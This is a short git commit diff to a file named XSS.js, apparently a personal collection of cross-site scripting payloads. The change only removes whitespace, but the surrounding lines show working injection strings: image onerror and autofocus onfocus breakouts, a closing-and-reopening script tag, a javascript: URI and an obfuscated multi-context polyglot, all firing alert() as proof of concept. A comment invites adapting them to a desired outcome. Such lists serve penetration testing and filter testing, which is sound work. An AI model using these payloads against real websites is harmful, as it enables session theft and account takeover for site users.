860a322bcb110f56fc18b02e303be9eff23dcc30
Steven Jenkins <45439182+SJ-Hydra@users.noreply.github.com>
2020-02-13 13:14:39 -0500

    Update XSS.js

--- XSS.js
+++ XSS.js
@@ -7,7 +7,6 @@ alter the payload to fit your desired outcome */
 
 
 // High Success -- Credit: Brute Logic 
-
 "><img src onerror=alert(1)>
 "autofocus onfocus=alert(2)//
 </script><script>alert(3)</script>
@@ -16,5 +15,5 @@ alter the payload to fit your desired outcome */
 javascript:alert(6)
 
 
-// Polyglot -- Credit:  0xSobky/HackVault 
+// Polyglot -- Credit: 0xSobky/HackVault 
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e
